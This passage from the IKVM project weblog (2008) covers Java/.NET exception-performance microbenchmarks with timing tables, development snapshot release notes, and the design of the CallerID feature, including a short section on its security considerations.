<P><A href="mailto:jeroen@frijters.net&amp;subject=PDC%20Meetup"><IMG alt="Meet me in Los Angeles -- PDC 2008" src="http://microsoftpdc.com/Images/BlogBling/Bling2.jpg" border=0></A></P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		07/09/2008 07:35:32 (W. Europe Daylight Time, UTC+02:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=cb24cc03-6a1c-42ce-8762-3ede24ca8640"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=cb24cc03-6a1c-42ce-8762-3ede24ca8640">Comments [1]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Monday, 30 June 2008</h2></div>
<div class="newsItems"><a name="a388b2a6d-e7b2-4ffa-86e7-450c87e6178f"></a><div class="entry">
	<h3 class="entryTitle">Exception Performance Part 2</h3>
	<div class="entryBody">
		<P><A HREF="/PermaLink.aspx?guid=062e4506-89c4-488e-9104-59c1ec80007b">Last time</A> we saw that CLR exception handling is significantly slower than HotSpot exception handling. This time we'll look at two very variations of the ExceptionPerf1 microbenchmark that significantly affect performance.</P>
<P>I've highlighted the changes.</P>
<P>Variation 1</P>
<P><CODE><FONT color=#0000ff>public class</FONT> <FONT color=#2b91af>ExceptionPerf2</FONT> {<BR>&nbsp; <FONT color=#0000ff>public static void</FONT> main(<FONT color=#2b91af>String</FONT>[] args) {<BR>&nbsp;&nbsp;&nbsp; <FONT color=#0000ff>long</FONT> start = <FONT color=#2b91af>System</FONT>.currentTimeMillis();<BR>&nbsp;&nbsp;&nbsp; <FONT color=#0000ff>for</FONT> (<FONT color=#0000ff>int</FONT> i = 0; i &lt; 100000; i++) {<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <FONT color=#0000ff>try</FONT> {<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <FONT color=#2b91af>Integer</FONT>.parseInt(<SPAN style="BACKGROUND-COLOR: #ffff00"><FONT color=#a31515>""</FONT></SPAN>);<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <FONT color=#0000ff>catch</FONT> (<FONT color=#2b91af>NumberFormatException</FONT> x) {<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<BR>&nbsp;&nbsp;&nbsp; }<BR>&nbsp;&nbsp;&nbsp; <FONT color=#0000ff>long</FONT> end = <FONT color=#2b91af>System</FONT>.currentTimeMillis();<BR>&nbsp;&nbsp;&nbsp; <FONT color=#2b91af>System</FONT>.out.println(end - start);<BR>&nbsp; }<BR>}</CODE></P>
<P>Variation 2</P>
<P><CODE><FONT color=#0000ff>public class</FONT> <FONT color=#2b91af>ExceptionPerf3</FONT> {<BR>&nbsp; <SPAN style="BACKGROUND-COLOR: #ffff00"><FONT color=#0000ff>static</FONT> <FONT color=#2b91af>NumberFormatException</FONT> exc;</SPAN><BR>&nbsp; <FONT color=#0000ff>public static void</FONT> main(<FONT color=#2b91af>String</FONT>[] args) {<BR>&nbsp;&nbsp;&nbsp; <FONT color=#0000ff>long</FONT> start = <FONT color=#2b91af>System</FONT>.currentTimeMillis();<BR>&nbsp;&nbsp;&nbsp; <FONT color=#0000ff>for</FONT> (<FONT color=#0000ff>int</FONT> i = 0; i &lt; 100000; i++) {<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <FONT color=#0000ff>try</FONT> {<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <FONT color=#2b91af>Integer</FONT>.parseInt(<FONT color=#0000ff>null</FONT>);<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <FONT color=#0000ff>catch</FONT> (<FONT color=#2b91af>NumberFormatException</FONT> x) {<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <SPAN style="BACKGROUND-COLOR: #ffff00">exc = x;</SPAN><BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<BR>&nbsp;&nbsp;&nbsp; }<BR>&nbsp;&nbsp;&nbsp; <FONT color=#0000ff>long</FONT> end = <FONT color=#2b91af>System</FONT>.currentTimeMillis();<BR>&nbsp;&nbsp;&nbsp; <FONT color=#2b91af>System</FONT>.out.println(end - start);<BR>&nbsp; }<BR>}</CODE></P>
<P>Results:</P>
<TABLE cellSpacing=0 border=0>
<TBODY>
<TR>
<TD style="BORDER-RIGHT: black 1px solid; BORDER-BOTTOM: black 1px solid">&nbsp;</TD>
<TD style="BORDER-BOTTOM: black 1px solid" align=right>&nbsp;&nbsp;&nbsp; HotSpot 1.6 x86</TD>
<TD style="BORDER-BOTTOM: black 1px solid" align=right>&nbsp;&nbsp;&nbsp; .NET 1.1 SP1</TD>
<TD style="BORDER-BOTTOM: black 1px solid" align=right>&nbsp;&nbsp;&nbsp; .NET 2.0 SP1 x86</TD>
<TD style="BORDER-BOTTOM: black 1px solid" align=right>&nbsp;&nbsp;&nbsp; Mono 1.9 x86</TD></TR>
<TR>
<TD style="BORDER-RIGHT: black 1px solid">ExceptionPerf1</TD>
<TD align=right>111</TD>
<TD align=right>14743</TD>
<TD align=right>3590</TD>
<TD align=right>537</TD></TR>
<TR>
<TD style="BORDER-RIGHT: black 1px solid">ExceptionPerf2</TD>
<TD align=right>140</TD>
<TD align=right>15735</TD>
<TD align=right>10761</TD>
<TD align=right>36309</TD></TR>
<TR>
<TD style="BORDER-RIGHT: black 1px solid">ExceptionPerf3</TD>
<TD align=right>112</TD>
<TD align=right>14946</TD>
<TD align=right>9728</TD>
<TD align=right>24107</TD></TR></TBODY></TABLE>
<P><BR>.NET/Mono results with IKVM 0.36</P>
<P><B>Why do these small changes have such a big perf impact?</B></P>
<P>Both these changes result in additional stack trace data being collected. IKVM has some optimizations that prevent gathering stack traces in very specific circumstances. Normally when you create a Java exception object, the <CODE><A href="http://java.sun.com/javase/6/docs/api/java/lang/Throwable.html">Throwable</A></CODE> constructor will call <CODE><A href="http://java.sun.com/javase/6/docs/api/java/lang/Throwable.html#fillInStackTrace()">Throwable.fillInStackTrace()</A></CODE>. However, since this is a very expensive operation, IKVM tries to remove this call when it is unnecessary (i.e. when it sees that you immediately throw the exception and the exception type doesn't override <CODE>Throwable.fillInStackTrace()</CODE>). Additionally, in Java an exception object will always have the complete stack trace, but a .NET exception only has the stack frames from the throw to the catch site. This means that at the catch site IKVM will collect the rest of the stack trace, unless the exception object isn't used (as in the ExceptionPerf1 microbenchmark).</P>
<P>The time it takes to collect a stack traces obviously depends on the call stack depth, so let's look at a microbenchmark to measure that effect:</P>
<P><CODE><FONT color=#0000ff>class</FONT> <FONT color=#2b91af>ExceptionPerf4</FONT> {<BR>&nbsp; <FONT color=#0000ff>public static void</FONT> main(<FONT color=#2b91af>String</FONT>[] args) {<BR>&nbsp;&nbsp;&nbsp; nest(<FONT color=#2b91af>Integer</FONT>.parseInt(args[0]));<BR>&nbsp; }<BR><BR>&nbsp; <FONT color=#0000ff>static void</FONT> nest(<FONT color=#0000ff>int</FONT> depth) {<BR>&nbsp;&nbsp;&nbsp; <FONT color=#0000ff>if</FONT> (depth &gt; 0) {<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; nest(depth - 1);<BR>&nbsp;&nbsp;&nbsp; } <FONT color=#0000ff>else</FONT> {<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; run();<BR>&nbsp;&nbsp;&nbsp; }<BR>&nbsp; }<BR><BR>&nbsp; <FONT color=#0000ff>static void</FONT> run() {<BR>&nbsp;&nbsp;&nbsp; <FONT color=#2b91af>Exception</FONT> x = new <FONT color=#2b91af>Exception</FONT>();<BR>&nbsp;&nbsp;&nbsp; <FONT color=#0000ff>long</FONT> start = <FONT color=#2b91af>System</FONT>.currentTimeMillis();<BR>&nbsp;&nbsp;&nbsp; <FONT color=#0000ff>for</FONT> (<FONT color=#0000ff>int</FONT> i = 0; i &lt; 100000; i++) {<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; x.fillInStackTrace();<BR>&nbsp;&nbsp;&nbsp; }<BR>&nbsp;&nbsp;&nbsp; <FONT color=#0000ff>long</FONT> end = <FONT color=#2b91af>System</FONT>.currentTimeMillis();<BR>&nbsp;&nbsp;&nbsp; <FONT color=#2b91af>System</FONT>.out.println(end - start);<BR>&nbsp; }<BR>}</CODE></P>
<P>Results:</P>
<TABLE cellSpacing=0 border=0>
<TBODY>
<TR>
<TD style="BORDER-RIGHT: black 1px solid; BORDER-BOTTOM: black 1px solid" align=right>Depth</TD>
<TD style="BORDER-BOTTOM: black 1px solid" align=right>&nbsp;&nbsp;&nbsp; HotSpot 1.6 x86</TD>
<TD style="BORDER-BOTTOM: black 1px solid" align=right>&nbsp;&nbsp;&nbsp; .NET 1.1 SP1</TD>
<TD style="BORDER-BOTTOM: black 1px solid" align=right>&nbsp;&nbsp;&nbsp; .NET 2.0 SP1 x86</TD>
<TD style="BORDER-BOTTOM: black 1px solid" align=right>&nbsp;&nbsp;&nbsp; Mono 1.9 x86</TD></TR>
<TR>
<TD style="BORDER-RIGHT: black 1px solid" align=right>1</TD>
<TD align=right>64</TD>
<TD align=right>2930</TD>
<TD align=right>4611</TD>
<TD align=right>19377</TD></TR>
<TR>
<TD style="BORDER-RIGHT: black 1px solid" align=right>10</TD>
<TD align=right>85</TD>
<TD align=right>3814</TD>
<TD align=right>6787</TD>
<TD align=right>34895</TD></TR>
<TR>
<TD style="BORDER-RIGHT: black 1px solid" align=right>100</TD>
<TD align=right>380</TD>
<TD align=right>12500</TD>
<TD align=right>27935</TD>
<TD align=right>&nbsp;</TD></TR>
<TR>
<TD style="BORDER-RIGHT: black 1px solid" align=right>1000</TD>
<TD align=right>3543</TD>
<TD align=right>&nbsp;</TD>
<TD align=right>&nbsp;</TD>
<TD align=right>&nbsp;</TD></TR></TBODY></TABLE><BR>
<P>For the curious, the IKVM implementation of <CODE>Throwable.fillInStackTrace()</CODE> is essentially <CODE>new <A href="http://msdn.microsoft.com/en-us/library/system.diagnostics.stacktrace.aspx">System.Diagnostics.StackTrace</A>(true);</CODE></P>
<P>Next time we'll wrap things up.</P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		06/30/2008 09:22:06 (W. Europe Daylight Time, UTC+02:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=388b2a6d-e7b2-4ffa-86e7-450c87e6178f"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=388b2a6d-e7b2-4ffa-86e7-450c87e6178f">Comments [1]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Wednesday, 25 June 2008</h2></div>
<div class="newsItems"><a name="a062e4506-89c4-488e-9104-59c1ec80007b"></a><div class="entry">
	<h3 class="entryTitle">Exception Performance Part 1</h3>
	<div class="entryBody">
		<P>One area where IKVM performance is much worse than HotSpot is in throwing and catching exceptions. This blog is the first of three that will look into why this is the case.</P>
<P>We start out with two microbenchmarks to highlight the differences.</P>
<P>Java</P>
<P><CODE><FONT color=#0000ff>public class</FONT> <FONT color=#2b91af>ExceptionPerf1</FONT> {<BR>&nbsp; <FONT color=#0000ff>public static void</FONT> main(<FONT color=#2b91af>String</FONT>[] args) {<BR>&nbsp;&nbsp;&nbsp; <FONT color=#0000ff>long</FONT> start = <FONT color=#2b91af>System</FONT>.currentTimeMillis();<BR>&nbsp;&nbsp;&nbsp; <FONT color=#0000ff>for</FONT> (<FONT color=#0000ff>int</FONT> i = 0; i &lt; 100000; i++) {<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <FONT color=#0000ff>try</FONT> {<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <FONT color=#2b91af>Integer</FONT>.parseInt(<FONT color=#0000ff>null</FONT>);<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <FONT color=#0000ff>catch</FONT> (<FONT color=#2b91af>NumberFormatException</FONT> x) {<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<BR>&nbsp;&nbsp;&nbsp; }<BR>&nbsp;&nbsp;&nbsp; <FONT color=#0000ff>long</FONT> end = <FONT color=#2b91af>System</FONT>.currentTimeMillis();<BR>&nbsp;&nbsp;&nbsp; <FONT color=#2b91af>System</FONT>.out.println(end - start);<BR>&nbsp; }<BR>}</CODE></P>
<P>C#</P>
<P><CODE><FONT color=#0000ff>using</FONT> System;<BR><BR><FONT color=#0000ff>class</FONT> <FONT color=#2b91af>ExceptionPerf1</FONT> {<BR>&nbsp; <FONT color=#0000ff>public static void</FONT> Main(<FONT color=#0000ff>string</FONT>[] args) {<BR>&nbsp;&nbsp;&nbsp; <FONT color=#0000ff>int</FONT> start = <FONT color=#2b91af>Environment</FONT>.TickCount;<BR>&nbsp;&nbsp;&nbsp; <FONT color=#0000ff>for</FONT> (<FONT color=#0000ff>int</FONT> i = 0; i &lt; 100000; i++) {<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <FONT color=#0000ff>try</FONT> {<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <FONT color=#0000ff>throw new</FONT> <FONT color=#2b91af>Exception</FONT>();<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <FONT color=#0000ff>catch</FONT> (<FONT color=#2b91af>Exception</FONT>) {<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<BR>&nbsp;&nbsp;&nbsp; }<BR>&nbsp;&nbsp;&nbsp; <FONT color=#0000ff>int</FONT> end = <FONT color=#2b91af>Environment</FONT>.TickCount;<BR>&nbsp;&nbsp;&nbsp; <FONT color=#2b91af>Console</FONT>.WriteLine(end - start);<BR>&nbsp; }<BR>}</CODE></P>
<P>Results:</P>
<TABLE cellSpacing=0 border=0>
<TBODY>
<TR>
<TD style="BORDER-RIGHT: black 1px solid; BORDER-BOTTOM: black 1px solid">&nbsp;</TD>
<TD style="BORDER-BOTTOM: black 1px solid" align=right>&nbsp;&nbsp;&nbsp; HotSpot 1.6 x86</TD>
<TD style="BORDER-BOTTOM: black 1px solid" align=right>&nbsp;&nbsp;&nbsp; .NET 1.1 SP1</TD>
<TD style="BORDER-BOTTOM: black 1px solid" align=right>&nbsp;&nbsp;&nbsp; .NET 2.0 SP1 x86</TD>
<TD style="BORDER-BOTTOM: black 1px solid" align=right>&nbsp;&nbsp;&nbsp; Mono 1.9 x86</TD></TR>
<TR>
<TD style="BORDER-RIGHT: black 1px solid">Java*</TD>
<TD align=right>111</TD>
<TD align=right>14743</TD>
<TD align=right>3590</TD>
<TD align=right>537</TD></TR>
<TR>
<TD style="BORDER-RIGHT: black 1px solid">C#</TD>
<TD align=right>&nbsp;</TD>
<TD align=right>11139</TD>
<TD align=right>2605</TD>
<TD align=right>187</TD></TR></TBODY></TABLE>
<P><BR>*.NET/Mono results with IKVM 0.36</P>
<P>This shows that the situation on the CLR is pretty bad. If you care about exception throwing performance, please complain to Microsoft instead of to me. Although I expect that they'll tell you not to throw so many exceptions. ;-)</P>
<P>On the next episode we'll see that the above microbenchmark is actually a best case scenario for IKVM and we'll see how things can get much worse...</P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		06/25/2008 12:40:19 (W. Europe Daylight Time, UTC+02:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=062e4506-89c4-488e-9104-59c1ec80007b"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=062e4506-89c4-488e-9104-59c1ec80007b">Comments [3]</a>
		
		<br clear="all">
	</div>
</div><a name="af0ac439f-699f-47ed-8d18-28eff25cfc40"></a><div class="entry">
	<h3 class="entryTitle">Useful Tool</h3>
	<div class="entryBody">
		<P><A href="http://andy-malakov.blogspot.com/2008/06/ant-task-for-ikvmc.html">Andy Malakov</A> wrote an <A href="http://ant-ikvmc.sourceforge.net/">Ant task for ikvmc</A>. It also contains a doclet that can generate an xml mapping file that contains all the parameter names that ikvmc can then attach to the .NET methods (ikvmc already does this for methods with debugging information, but that doesn't work for abstract methods).</P>
<P>Good stuff!</P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		06/25/2008 09:08:54 (W. Europe Daylight Time, UTC+02:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=f0ac439f-699f-47ed-8d18-28eff25cfc40"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=f0ac439f-699f-47ed-8d18-28eff25cfc40">Comments [0]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Friday, 13 June 2008</h2></div>
<div class="newsItems"><a name="a5612c913-abaf-474a-8bbf-c192c30735c8"></a><div class="entry">
	<h3 class="entryTitle">New Development Snapshot</h3>
	<div class="entryBody">
		<P>I've finally updated to a new drop of OpenJDK. If you want to build IKVM from source you'll need the directory resulting from a full build of OpenJDK 6 b10 on Linux AMD64 (although I suppose that if you change the paths in ikvm/openjdk/allsources.lst you'll be able to use an x86 version as well). At some point I'll release a zip file containing just the needed artifacts, but that will take some more time.</P>
<P>IKVM.OpenJDK.ClassLibrary.dll grew in size to 31,657,984 bytes, mostly because the character de-/encoders that live inside charsets.jar are now included as well. I know size is a big issue for many people and as <A HREF="/PermaLink.aspx?guid=57b1b4e1-778e-4487-89ce-34ab2b1a1de8">previously discussed</A> I'm still planning to split the class library assembly into several different files.</P>
<P>Changes since previous development snapshot:</P>
<UL>
<LI>Integrated <A href="http://download.java.net/openjdk/jdk6/promoted/b10/openjdk-6-src-b10_30_may_2008.tar.gz">OpenJDK 6 b10</A>.</LI>
<LI>Fixed Method.getParameterAnnotations() bug introduced by CallerID support.</LI>
<LI>Changed forked <A href="http://java.sun.com/javase/6/docs/api/java/util/concurrent/locks/AbstractQueuedSynchronizer.html">AbstractQueuedSynchronizer</A> to use AtomicReferenceFieldUpdater instead of map.xml based compareAndSet methods to reduce the number of differences between upstream and our version.</LI>
<LI>Fixed three String bugs found by OpenJDK string tests.</LI></UL>
<P><B>WARNING: THIS IS A DEVELOPMENT SNAPSHOT, NOT AN OFFICIAL RELEASE.</B><BR><BR>Development snapshots are intended for evaluating and keeping track of where the project is going, not for production usage. The binaries have not been extensively tested and are not strong named.<BR><BR>If you want to run this version on Mono, you'll need a Mono version built from recent svn, it does not work on Mono 1.9.<BR><BR>Binaries available here: <A href="http://www.frijters.net/ikvmbin-0.37.3086.zip">ikvmbin-0.37.3086.zip</A></P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		06/13/2008 11:58:01 (W. Europe Daylight Time, UTC+02:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=5612c913-abaf-474a-8bbf-c192c30735c8"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=5612c913-abaf-474a-8bbf-c192c30735c8">Comments [3]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Wednesday, 04 June 2008</h2></div>
<div class="newsItems"><a name="a58be4e99-1a01-4c8a-bc45-d00cc8babe8f"></a><div class="entry">
	<h3 class="entryTitle">New Development Snapshot</h3>
	<div class="entryBody">
		<P>Changes since previous development snapshot:</P>
<UL>
<LI>Code clean up and refactoring.</LI>
<LI>Removed security asserts in JVM.CriticalFailure, because they no longer work now that IKVM.Runtime is security transparent.</LI>
<LI>Implemented CallerID infrastructure.</LI>
<LI>Marked various methods with HasCallerID annotation.</LI>
<LI>Applied awt patch <A href="http://sourceforge.net/tracker/index.php?func=detail&amp;aid=1979656&amp;group_id=69637&amp;atid=525266">#1979656</A> by Daniel Wilson.</LI></UL>
<P><B>WARNING: THIS IS A DEVELOPMENT SNAPSHOT, NOT AN OFFICIAL RELEASE.</B><BR><BR>Development snapshots are intended for evaluating and keeping track of where the project is going, not for production usage. The binaries have not been extensively tested and are not strong named.<BR><BR>If you want to run this version on Mono, you'll need a Mono version built from recent svn, it does not work on Mono 1.9.<BR><BR>Binaries available here: <A href="http://www.frijters.net/ikvmbin-0.37.3077.zip">ikvmbin-0.37.3077.zip</A></P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		06/04/2008 07:24:21 (W. Europe Daylight Time, UTC+02:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=58be4e99-1a01-4c8a-bc45-d00cc8babe8f"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=58be4e99-1a01-4c8a-bc45-d00cc8babe8f">Comments [0]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Monday, 02 June 2008</h2></div>
<div class="newsItems"><a name="a6cc61620-3b8f-4e9e-8648-d852725a708f"></a><div class="entry">
	<h3 class="entryTitle">Introducing CallerID Part 3</h3>
	<div class="entryBody">
		<P>This is the last part of a three part backward running series on the design, <A HREF="/PermaLink.aspx?guid=d782ef31-865a-4dd9-aa1b-dd5b7a404676">implementation</A> and <A HREF="/PermaLink.aspx?guid=2b345417-9641-4277-8696-0b9e1f30bf6d">performance results</A> of the CallerID feature.</P>
<P><B>How To Pass Information From Caller To Callee</B></P>
<P>The obvious solution is to use a method parameter, but in this case there is a slight complication: We can't necessarily trust the caller to provide truthful information.</P>
<P>The first scheme I came up with was something like this:</P>
<P><CODE><FONT color=#0000ff>class</FONT> <FONT color=#2b91af>CallSiteExample</FONT> {<BR>&nbsp; <FONT color=#0000ff>private static</FONT> <FONT color=#2b91af>CallerID</FONT> __callerID;<BR><BR>&nbsp; <FONT color=#0000ff>static void</FONT> method() {<BR>&nbsp;&nbsp;&nbsp; <FONT color=#2b91af>Class</FONT>.forName(<FONT color=#a31515>"..."</FONT>, <FONT color=#0000ff>ref</FONT> __callerID);<BR>&nbsp; }<BR>}</CODE></P>
<P>Here <CODE>CallerID</CODE> would be a value type defined in IKVM.Runtime and its content (a <CODE>Class</CODE> and <CODE>ClassLoader</CODE> reference field) would only be accessible to the runtime and core class library. Inside the callee there would be a check to see if the required field in the CallerID value had been initialized and if not, it would walk up the stack to determine the caller and store the result in the CallerID value.</P>
<P>The obvious downside of this scheme is that it would still require a stack walk the first time a call site does a call. A less obvious downside is that this approach makes it harder to pass the CallerID to another method. This is used in a couple of places where the callee doesn't do the actual work of looking at the caller. Take for exampe <CODE>java.lang.reflect.Field.get()</CODE>:</P>
<P><CODE>@ikvm.internal.<FONT color=#2b91af>HasCallerID</FONT><BR><FONT color=#0000ff>public</FONT> <FONT color=#2b91af>Object</FONT> get(<FONT color=#2b91af>Object</FONT> obj)<BR>&nbsp;&nbsp;&nbsp; <FONT color=#0000ff>throws</FONT> <FONT color=#2b91af>IllegalArgumentException</FONT>, <FONT color=#2b91af>IllegalAccessException</FONT><BR>{<BR>&nbsp;&nbsp;&nbsp; <FONT color=#0000ff>return</FONT> getFieldAccessor(obj, <FONT color=#2b91af>CallerID</FONT>.getCallerID()).get(obj);<BR>}</CODE></P>
<P>Here the actual access check is in <CODE>getFieldAccessor</CODE> (actually, it in turn calls another method to do the security check) and I used the <CODE>CallerID.getCallerID()</CODE> intrinsic to pass the implicit callerID parameter explicitly to this other method. Doing this with the value type byref approach would have made this a lot harder.</P>
<P><B>Nested Types</B></P>
<P>The design sketched above is actually fairly old, but I had never implemented it due to a nagging feeling that it wasn't quite right. I think my primary concern was that it didn't actually get rid of the stack walk, it only reduced them to at most one per caller. Last week as I was helping someone with a <A href="http://sourceforge.net/mailarchive/message.php?msg_name=B866D2B6BBAAAD44B1D109ED50EE131E48729EB69E@jambi.sumatrasoftware.com">problem</A> that turned out to be caused by a stack walking issue on Mono running on ARM I realized that I should get rid of the stack walk altogether and came up with the trick of using a nested type to create an unforgeable token to represent a class.</P>
<P><B>Reflection</B></P>
<P>Another instance of passing around the CallerID is found in reflection. When you call a method via reflection, the immediate caller of that method will, of course, be some VM internal method or Method.invoke() depending on the exact implementation, so the stack walking mechanism that the JDK (and previous IKVM versions) use skips all stack frames related to reflection to get to the real caller. However, with the new scheme, <CODE>Method.invoke()</CODE> already gets passed in the CallerID, so it would be a shame not to use this and, of course, it is trivial to pass this value along to the call stub which can then (if required) pass it along to the method being called.</P>
<P><B>Why the Explicit HasCallerID Annotation?</B></P>
<P>I could have made ikvmc add the implicit CallerID parameter to every method that calls one of the intrinsics that return the caller, but this has three downsides. The first is that it would have made compiling the core class library slower, because ikvmc would have had to check every method to see if it calls one of these intrinsics (the .NET method signature gets determined way before the method body is processed). The second is that since the additional parameter is, in a sense, part of the public API it should be a conscious decision. The third reasons is that the implicit approach doesn't work with methods that indirectly look at the caller, like the <CODE>Field.get()</CODE> example above, so I would have needed to add a mechanism for that anyway.</P>
<P><B>Limitations</B></P>
<P>The current implementation doesn't support adding a CallerID parameter to constructors. This is simply the result of the fact that there aren't any constructors that require CallerID that I'm aware of. Another limitation is that the HasCallerID annotation is only recognized for static methods or instance methods on final classes. This means that <CODE>ClassLoader.getParent()</CODE> doesn't currently have CallerID support, even though it does want to look at the caller if there is a security manager installed.</P>
<P><B>Security Considerations</B></P>
<P>While it's generally not possible to inject a nested type into an arbitrary type, it may be possible to trick another (dynamic) CLR language into creating such a type. However, I think the risk of that is sufficiently low to make it acceptable.</P>
<P>Another risk is that someone may steal a CallerID object from another type and try to impersonate that type. Since .NET 2.0 SP1 it is actually possible for partially trusted code to use reflection to access private fields if you have the <A href="http://msdn.microsoft.com/en-us/library/system.security.permissions.reflectionpermissionattribute.restrictedmemberaccess.aspx">RestrictedMemberAccess</A> permission and both assemblies have the same security grant set. However, since this requires .NET reflection (the callerID field isn't visible from the Java reflection APIs) and there already are several ways to bypass Java's security model by directly using .NET APIs this is also a non-issue.</P>
<P>Finally, it is not possible for untrusted Java code to use the HasCallerID annotation, because ikvmc only recognizes the HasCallerID annotation while compiling the core class library and the IKVM runtime only recognizes CallerID methods in the core class library.</P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		06/02/2008 08:20:41 (W. Europe Daylight Time, UTC+02:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=6cc61620-3b8f-4e9e-8648-d852725a708f"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=6cc61620-3b8f-4e9e-8648-d852725a708f">Comments [2]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Sunday, 01 June 2008</h2></div>
<div class="newsItems"><a name="ad782ef31-865a-4dd9-aa1b-dd5b7a404676"></a><div class="entry">
	<h3 class="entryTitle">Introducing CallerID Part 2</h3>
	<div class="entryBody">
		<P>In <A href="/PermaLink.aspx?guid=2b345417-9641-4277-8696-0b9e1f30bf6d">part 1</A> we saw the Java source for the ForName benchmark, now let's look at some C# code that is roughly equivalent to what IKVM generates from the Java version:</P>
